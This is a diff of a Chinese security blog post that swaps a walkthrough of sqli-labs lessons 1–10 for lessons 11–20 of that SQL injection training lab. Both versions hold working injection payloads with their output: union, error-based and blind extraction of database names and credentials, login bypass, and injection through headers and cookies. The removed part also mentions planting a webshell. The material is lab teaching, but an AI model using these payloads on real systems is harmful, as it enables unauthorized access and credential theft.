@@ -22,7 +22,7 @@
 
   
 
-  <title>SQL注入-sqli-labs-less1-10 | Liv_binz的技术博客</title>
+  <title>SQL注入-sqli-labs-less11-20 | Liv_binz的技术博客</title>
 
   
 
@@ -90,11 +90,11 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">SQL注入-sqli-labs-less1-10</h1>
+          <h1 class="title-wrap">SQL注入-sqli-labs-less11-20</h1>
           <h2 class="title-sub-wrap">
             <strong>b1nz</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-01-25T10:26:33.029Z" itemprop="datePublished">2022-01-25</time>
+            <time  class="article-date" datetime="2022-01-26T06:24:44.219Z" itemprop="datePublished">2022-01-26</time>
           </h2>
           <ul class="wrap-list dark">
   
@@ -127,287 +127,245 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="Sqli-labs-Less1"><a href="#Sqli-labs-Less1" class="headerlink" title="Sqli-labs Less1"></a>Sqli-labs Less1</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+        <h1 id="Sqli-labs-Less11"><a href="#Sqli-labs-Less11" class="headerlink" title="Sqli-labs Less11"></a>Sqli-labs Less11</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code>$uname=$_POST[&#39;uname&#39;];
+$passwd=$_POST[&#39;passwd&#39;];
+
+@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
+
 if true:
-    输出查询内容
+    正常回显
 else:
     print_r(mysql_error());
 </code></pre>
 <ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=‘1’</strong></li>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=‘admin’</strong></li>
 <li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
 </ol>
-<h2 id="联合注入过程"><a href="#联合注入过程" class="headerlink" title="联合注入过程"></a>联合注入过程</h2><pre><code>?id=1&#39; order by 1 --+
-    回显正常
-?id=1&#39; order by 2 --+
-    回显正常
-?id=1&#39; order by 3 --+
-    回显正常
-?id=1&#39; order by 4 --+
-    回显错误
-</code></pre>
-<p>证明列数=3</p>
-<pre><code>查库：
-?id=-1&#39; union select 1,2,database() --+
-回显：
-Your Login name:2
-Your Password:security
-</code></pre>
-<p>当前库名为：security</p>
-<pre><code>查表：
-?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+
-#注意：用16进制避免了单括号的出现
-回显：
-Your Login name:2
-Your Password:emails,referers,uagents,users
-</code></pre>
-<p>当前库内表名为：emails,referers,uagents,users</p>
-<pre><code>查users表的列：
-?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 --+
-回显：
-Your Login name:2
-Your Password:id,username,password
-</code></pre>
-<p>当前表内列名为：id,username,password</p>
-<pre><code>查字段：
-?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users --+
-回显：
-Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
-Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
-</code></pre>
-<p>以上</p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="0x0-原理"><a href="#0x0-原理" class="headerlink" title="0x0 原理"></a>0x0 原理</h3><p><strong>0x1 基于格式错误的报错</strong></p>
-<p><strong>1.  extractvalue()</strong></p>
-<p>正确使用格式：extractvalue(xml_document,Xpath_string)</p>
-<p>作用：从document中返回包含string的字符</p>
-<p>分析： 因为报错中会返回 Xpath_string 所以在此处构造语句 即可在报错中看见所需要的相关信息</p>
-<p>利用 <strong>~ (0x7e) # (0x23) $ (0x24)</strong> 不符合Xpath的语法规则这一点构造语句</p>
-<p><strong>2. updatexml()</strong></p>
-<p>正确使用格式：updatexml(xml_document,xpath_string,new_value)</p>
-<p>作用：将document中含有string的字符改成new_value</p>
-<p>原理与extractvalue()函数相同，不多说<br><strong>0x2 基于主键重复的报错</strong></p>
-<p> 运用<strong>group by</strong>、<strong>count()<strong>、</strong>floor()<strong>、</strong>rand()</strong> 构成的注入 </p>
 <blockquote>
-<p>在俺找这个注入原理看的时候看睡着了TT 看到最后也并不是完全通透,网上关于这个报错的原理就有点少,实在不理解我觉得会用就行哈</p>
+<p>GET型和POST型</p>
+<p>注入点位置不同而已, 其他方法都是一样的</p>
+<p>不过POST稍微麻烦点 得加上个抓包的步骤</p>
 </blockquote>
-<p>这四个函数每一个都是产生报错的必要条件!!</p>
-<p>具体为什么,听我细细说来</p>
-<p>首先介绍一下**rand()**这个东西</p>
-<p>很有意思,你看上去他好像是随机的,其实给他一个种子数会生成一个伪静态序列</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126105109.png" alt="figure 1"></p>
-<p>无论运行几次都是一样的结果呢!</p>
+<p>输入 user:admin password:admin</p>
+<p>请求如下:</p>
+<pre><code>POST /Less-11/ HTTP/1.1
+Host: 127.0.0.1:4000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Origin: http://127.0.0.1:4000
+Connection: close
+Referer: http://127.0.0.1:4000/Less-11/
+Upgrade-Insecure-Requests: 1
+
+uname=admin&amp;passwd=admin&amp;submit=Submit
+</code></pre>
+<h2 id="登陆绕过"><a href="#登陆绕过" class="headerlink" title="登陆绕过"></a>登陆绕过</h2><p>这边包含一个最简单的登陆绕过知识点</p>
 <blockquote>
-<p>官方文档曾经提示过,在查表的时候rand()会多次调用. 俺猜测,本身随机的效果就是靠多次调用来完成的</p>
-<p>只是猜的!!</p>
+<p>之前看大黑书WAHH的时候就学到过</p>
+<p>还做过portswigger自己靶场的一道题</p>
+<p>WAHH page 288-289</p>
+<p>lab: <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">https://portswigger.net/web-security/sql-injection/lab-login-bypass</a></p>
 </blockquote>
-<p>**floor()**向下取整函数 没啥好多说的</p>
-<p>但是配合<strong>rand(0)*2</strong>就会出现魔法</p>
-<p>首先: <strong>rand(0)*2</strong>生成了一个 [0,2] 的伪静态数列</p>
-<p>配合**floor()**使用就生成了一个只有0和1的伪静态数列,如图:</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126111656.png" alt="figure 2"></p>
-<p><strong>注意!!这串序列是固定的011011….</strong></p>
-<p>讲一下,count()<strong>和</strong>count(*)<strong>的区别在</strong>count(*)不会忽略null值</p>
-<p>搭配<strong>group by</strong>使用也很常规 不多说了</p>
-<p>接下来就是奇迹发生的地方了:</p>
-<pre><code>语句:SELECT count(*) from users group by concat(database(),floor(rand(0)*2))
+<p>看看源码就可以知道, 我们可以轻松地把password注释掉, 如下:</p>
+<pre><code>uname=admin&#39;#&amp;passwd=admin&amp;submit=Submit
 </code></pre>
-<p>产生报错,如图:</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126112846.png" alt="figure 3"></p>
-<p><strong>为什么捏为什么捏发生什么事了捏?</strong></p>
-<p>事情是这样发生的:</p>
-<p>首先<strong>group by</strong>会生成一个临时表</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126113822.png" alt="figure 4"></p>
-<p><strong>本来过程应该是这样的:</strong></p>
-<p>第一位选手:security0, 检索临时表, 表内没有已有的符合条件的key, 所以插入一个security0的key, count(*)计数+1</p>
-<p><strong>但实际上是这样的:</strong></p>
-<p>第一位选手:security0, 检索临时表, 表内没有已有的符合条件的key</p>
 <blockquote>
-<p>此时rand()又被调用了! 导致我们的的第一位选手改头换面变成了security1</p>
+<p>不过要注意! data里面不能用+,所以不能用–+,这边可以用#来代替,也可以手动加空格</p>
 </blockquote>
-<p>所以插入一个security1的key, count(*)计1, 如图</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126114643.png"></p>
-<p>随后,我们的第二位选手:security1登场, 已有符合的key, count(*)计数+1, 如图:</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220126114928.png"></p>
-<p>第三位选手:security0登场, 没有符合的key</p>
-<blockquote>
-<p>rand()又被调用了! 这一位选手又改头换面变成了security1</p>
-</blockquote>
-<p>于是它又试图插入security1 <strong>buzz! error !</strong></p>
-<p>报错原理就是这样, 剩下的就是构造语句了 easypeasy</p>
-<h3 id="1x0-注入过程"><a href="#1x0-注入过程" class="headerlink" title="1x0 注入过程"></a>1x0 注入过程</h3><p><strong>1x1 基于格式错误的报错</strong></p>
-<p><strong>1. extractvalue()</strong></p>
-<pre><code>查库：
-?id=-1&#39; and extractvalue(1,concat(0x7e,(select database())))--+
-回显：
-XPATH syntax error: &#39;~security&#39;
+<p>但只有已知一个用户名的情况下可以做到, 如果不知道任何用户名呢?</p>
+<p><strong>OR</strong> 一个永真条件就是了, 如下:</p>
+<pre><code>uname=&#39; or 1=1#&amp;passwd=admin&amp;submit=Submit
 </code></pre>
-<p>当前库名为security</p>
-<pre><code>查表：
-?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)))--+
-回显：
-XPATH syntax error: &#39;~emails,referers,uagents,users&#39; 
-</code></pre>
-<p>当前库内表名为：emails,referers,uagents,users</p>
-<pre><code>查users表的列：
-?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273)))--+
-回显：
-XPATH syntax error: &#39;~id,username,password&#39;
-</code></pre>
-<p>当前表内列名为：id,username,password</p>
-<pre><code>查字段：
-?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username) from users)))--+
-回显：
-XPATH syntax error: &#39;~Dumb,Angelina,Dummy,secure,stup&#39;
-</code></pre>
-<p>注意：报错信息最多显示32位 若需要全部信息 运用limit构造payload如下</p>
-<pre><code>查字段：
-?id=-1&#39; and extractvalue(1,concat(0x7e,(select username from users limit+0,1))) --+
-回显：
-XPATH syntax error: &#39;~Dumb&#39;
-</code></pre>
-<p>limit+0,1依次偏移来获取全部数据</p>
-<p><strong>2. updatexml()</strong></p>
-<p>注入过程与extractvalue()函数相同，不多说</p>
-<p><strong>1x2 基于主键重复的报错</strong></p>
-<pre><code>查库:
-?id=-1&#39; union select 1,2,count(*) from users group by concat(database(),floor(rand(0)*2)) --+
-回显:
-Duplicate entry &#39;security1&#39; for key &#39;&#39;
-</code></pre>
-<p>当前库名为security</p>
-<pre><code>查表:
-?id=-1&#39; union select 1,2,count(*) from users group by concat((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit+0,1) ,floor(rand(0)*2)) --+
-回显:
-Duplicate entry &#39;emails1&#39; for key &#39;&#39;
-</code></pre>
-<p>limit+0,1依次偏移来获取全部数据</p>
-<pre><code>查列:
-?id=-1&#39; union select 1,2,count(*) from users group by concat((select column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit+0,1) ,floor(rand(0)*2)) --+
-回显:
-Duplicate entry &#39;id1&#39; for key &#39;&#39;
-</code></pre>
-<p>limit+0,1依次偏移来获取全部数据</p>
-<pre><code>查字段:
-?id=-1&#39; union select 1,2,count(*) from users group by concat((select password from users limit+0,1) ,floor(rand(0)*2)) --+
-回显:
-Duplicate entry &#39;Dumb1&#39; for key &#39;&#39;
-</code></pre>
-<p>limit+0,1依次偏移来获取全部数据</p>
-<h2 id="布尔盲注过程"><a href="#布尔盲注过程" class="headerlink" title="布尔盲注过程"></a>布尔盲注过程</h2><pre><code>查库:
-?id=1&#39; and left(database(),1)=&#39;s&#39; --+
+<p>此时返回的是全部字段,可以添加limit 0,1逐个偏移来换账户,如下:</p>
+<pre><code>uname=&#39; or 1=1 limit 0,1#&amp;passwd=admin&amp;submit=Submit
 回显:
 Your Login name:Dumb
 Your Password:Dumb
+
+uname=&#39; or 1=1 limit 1,1#&amp;passwd=admin&amp;submit=Submit
+回显:
+Your Login name:Angelina
+Your Password:I-kill-you
 </code></pre>
-<p>一般配合bp intruder食用 查其他数据也一样, 不多说</p>
-<p>原始人方法是:</p>
-<ol>
-<li>判断语句: “ascii(substring()) <u>operator</u> 一个数字”</li>
-<li>二分法<br>搭配食用</li>
-</ol>
-<h2 id="延时注入过程"><a href="#延时注入过程" class="headerlink" title="延时注入过程"></a>延时注入过程</h2><pre><code>查库:
-?id=1&#39; and if(left(database(),1)=&#39;c&#39; ,1,sleep(3)) --+
-</code></pre>
-<p>和布尔盲注一样, 一般配合bp intruder食用</p>
-<blockquote>
-<p>其实用intruder也是原始人 一般直接配合sqlmap食用(逃ε=ε=ε=┏(゜ロ゜;)┛)</p>
-<p>等我心情好自己写个盲注脚本</p>
-</blockquote>
-<h1 id="Sqli-labs-Less2"><a href="#Sqli-labs-Less2" class="headerlink" title="Sqli-labs Less2"></a>Sqli-labs Less2</h1><ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=1</strong></li>
+<p>接下来联合、报错、布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less12"><a href="#Sqli-labs-Less12" class="headerlink" title="Sqli-labs Less12"></a>Sqli-labs Less12</h1><ol>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=(‘admin’)</strong></li>
 <li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
 </ol>
-<p>其他过程与less1相同</p>
-<h1 id="Sqli-labs-Less3"><a href="#Sqli-labs-Less3" class="headerlink" title="Sqli-labs Less3"></a>Sqli-labs Less3</h1><ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=’’1’’</strong></li>
-<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
-</ol>
-<p>其他过程与less1相同</p>
-<h1 id="Sqli-labs-Less4"><a href="#Sqli-labs-Less4" class="headerlink" title="Sqli-labs Less4"></a>Sqli-labs Less4</h1><ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=(“1”)</strong></li>
-<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
-</ol>
-<p>其他过程与less1相同</p>
-<h1 id="Sqli-labs-Less5"><a href="#Sqli-labs-Less5" class="headerlink" title="Sqli-labs Less5"></a>Sqli-labs Less5</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+<p>与less-11相仿</p>
+<p>联合、报错、布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less13"><a href="#Sqli-labs-Less13" class="headerlink" title="Sqli-labs Less13"></a>Sqli-labs Less13</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><pre><code>$uname=$_POST[&#39;uname&#39;];
+$passwd=$_POST[&#39;passwd&#39;];
+
+@$sql=&quot;SELECT username, password FROM users WHERE username=(&#39;$uname&#39;) and password=(&#39;$passwd&#39;) LIMIT 0,1&quot;;
 
 if true:
-    输出 You are in...........
+    没有回显
 else:
     print_r(mysql_error());
 </code></pre>
 <ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=’1’</strong></li>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=(‘admin’)</strong></li>
 <li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
 </ol>
-<p>其他过程与less1相同</p>
-<h1 id="Sqli-labs-Less6"><a href="#Sqli-labs-Less6" class="headerlink" title="Sqli-labs Less6"></a>Sqli-labs Less6</h1><ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=”1”</strong></li>
+<p>报错、布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less14"><a href="#Sqli-labs-Less14" class="headerlink" title="Sqli-labs Less14"></a>Sqli-labs Less14</h1><ol>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=”admin”</strong></li>
 <li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
 </ol>
-<p>其他过程与less1相同</p>
-<h1 id="Sqli-labs-Less7"><a href="#Sqli-labs-Less7" class="headerlink" title="Sqli-labs Less7"></a>Sqli-labs Less7</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><pre><code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;
+<p>与less-13相仿</p>
+<p>报错、布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less15"><a href="#Sqli-labs-Less15" class="headerlink" title="Sqli-labs Less15"></a>Sqli-labs Less15</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><pre><code>$uname=$_POST[&#39;uname&#39;];
+$passwd=$_POST[&#39;passwd&#39;];
+
+@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
 
 if true:
-    输出 You are in.... Use outfile......
+    正常回显
 else:
-    输出 You have an error in your SQL syntax
+    没有回显
 </code></pre>
 <ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=”1”</strong></li>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=’admin’</strong></li>
 <li>注入类型— <strong>布尔盲注、延时</strong></li>
 </ol>
-<p>其他过程与less1相同</p>
-<p>特别的是: 这个地方作者给了一个hint:</p>
-<pre><code>use outfile
+<p>布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less16"><a href="#Sqli-labs-Less16" class="headerlink" title="Sqli-labs Less16"></a>Sqli-labs Less16</h1><ol>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=(“admin”)</strong></li>
+<li>注入类型— <strong>布尔盲注、延时</strong></li>
+</ol>
+<p>与less-15相仿</p>
+<p>布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less17"><a href="#Sqli-labs-Less17" class="headerlink" title="Sqli-labs Less17"></a>Sqli-labs Less17</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><pre><code>//making sure uname is not injectable
+$uname=check_input($_POST[&#39;uname&#39;]);  
+
+$passwd=$_POST[&#39;passwd&#39;];
+
+@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;
+
+if uname ture:
+    $update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;
+    if error:
+        print_r(mysql_error());
+    else:
+        正常回显
+else:
+    bug off you silly dumb hacker
 </code></pre>
+<ol>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=’admin’</strong></li>
+<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
+</ol>
+<p>uname的输入被检查了,不可注入</p>
+<p>注入点在update语句</p>
+<p>报错、布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less18"><a href="#Sqli-labs-Less18" class="headerlink" title="Sqli-labs Less18"></a>Sqli-labs Less18</h1><h2 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h2><pre><code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];
+$IP = $_SERVER[&#39;REMOTE_ADDR&#39;];
+
+if 有uname和passwd输入:
+    $uname = check_input($_POST[&#39;uname&#39;]);
+    $passwd = check_input($_POST[&#39;passwd&#39;]);
+
+    $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+
+    $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;
+
+    if true:
+        回显ua
+        print_r(mysql_error());
+    else
+        print_r(mysql_error());
+</code></pre>
+<ol>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=(‘admin’)</strong></li>
+<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
+</ol>
+<p>uname和passwd都被检查了,不可注入</p>
+<p>注入点在UA</p>
 <blockquote>
-<p>大家注意一下 </p>
-<p>此处有数据库权限问题</p>
-<p>和全局变量secure有关系</p>
-<p>当secure_file_priv 的值为 null 时: 不允许导入导出文件</p>
-<p>当secure_file_priv 的值为 /tmp/ 时: 导入导出文件只能发生在/tmp/目录下</p>
-<p>当secure_file_priv 的值为 空 时: 不对导入导出文件做限制</p>
+<p>PHP 里用来获取客户端 IP 的变量</p>
 </blockquote>
-<p>俺也不是很明白作者到底啥意思哈 冷不丁来一句</p>
-<p>如果可以导入导出文件, 建议一句话木马配合蚁剑食用,美滋滋,这里不多说</p>
-<h1 id="Sqli-labs-Less8"><a href="#Sqli-labs-Less8" class="headerlink" title="Sqli-labs Less8"></a>Sqli-labs Less8</h1><ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=’1’</strong></li>
-<li>注入类型— <strong>布尔盲注、延时</strong></li>
-</ol>
-<p>其他过程与less1相同</p>
-<h1 id="Sqli-labs-Less9"><a href="#Sqli-labs-Less9" class="headerlink" title="Sqli-labs Less9"></a>Sqli-labs Less9</h1><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+<blockquote>
+<p>$_SERVER[&#39;HTTP_CLIENT_IP&#39;] 这个很少使用，不一定服务器都实现了。客户端可以伪造。</p>
+<p>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] ，客户端可以伪造。</p>
+<p>$_SERVER[&#39;REMOTE_ADDR&#39;] ，客户端不能伪造</p>
+</blockquote>
+<p>报错、布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less19"><a href="#Sqli-labs-Less19" class="headerlink" title="Sqli-labs Less19"></a>Sqli-labs Less19</h1><h2 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h2><pre><code>$uagent = $_SERVER[&#39;HTTP_REFERER&#39;];
+$IP = $_SERVER[&#39;REMOTE_ADDR&#39;];
+
+if 输入了uname 和 passwd:
+    $uname = check_input($_POST[&#39;uname&#39;]);
+    $passwd = check_input($_POST[&#39;passwd&#39;]);
+
+    $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
 
 if true:
-    输出 You are in............
+    $insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;
+    回显referer
+    print_r(mysql_error());    
 else:
-    输出 You are in...........
+    print_r(mysql_error());    
 </code></pre>
 <ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=’1’</strong></li>
-<li>注入类型— <strong>延时</strong></li>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=’admin’</strong></li>
+<li>注入类型— <strong>报错、布尔盲注、延时</strong></li>
 </ol>
-<p>其他过程与less1相同</p>
-<h1 id="Sqli-labs-Less10"><a href="#Sqli-labs-Less10" class="headerlink" title="Sqli-labs Less10"></a>Sqli-labs Less10</h1><ol>
-<li>请求方式— <strong>GET</strong></li>
-<li>包裹方式— <strong>id=”1”</strong></li>
-<li>注入类型— <strong>延时</strong></li>
+<p>注入点在referer</p>
+<p>报错、布尔盲注、延时常规操作与less-1相同</p>
+<h1 id="Sqli-labs-Less20"><a href="#Sqli-labs-Less20" class="headerlink" title="Sqli-labs Less20"></a>Sqli-labs Less20</h1><h2 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h2><pre><code>if cookie 中不存在 uname 参数:  
+    回显一些东东
+    if 输入了uname 和 passwd:
+        $uname = check_input($_POST[&#39;uname&#39;]);
+        $passwd = check_input($_POST[&#39;passwd&#39;]);
+
+        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+        $cookee = $row1[&#39;username&#39;];
+        if true:
+            # 将 uname 的值设置给 cookie 里面的 uname 参数
+            setcookie(&#39;uname&#39;, $cookee, time()+3600);
+        else:
+            print_r(mysql_error());
+
+else:
+    if POST 数据里面没有 submit 参数:
+        $cookee = $_COOKIE[&#39;uname&#39;];
+        $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;
+        if 报错:
+            输出 mysql_error()
+        if true:
+            正常回显
+    else:
+        # 将 uname 的值设置给 cookie 里面的 uname 参数
+        setcookie(&#39;uname&#39;, $row1[&#39;username&#39;], time()-3600);
+</code></pre>
+<ol>
+<li>请求方式— <strong>POST</strong></li>
+<li>包裹方式— <strong>uname=’admin’</strong></li>
+<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
 </ol>
-<p>其他过程与less1相同</p>
+<p>注入点在cookie</p>
+<p>联合、报错、布尔盲注、延时常规操作与less-1相同</p>
 
       </section>
 
       
       
         <nav class="article-nav">
+          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -416,15 +374,14 @@ else:
     
     <div class="card-text">
       
-        <a href="/2022/01/26/sqli2/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">SQL注入-sqli-labs-less11-20</h2>
+        <a href="/2022/01/25/sqli1/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">SQL注入-sqli-labs-less1-10</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
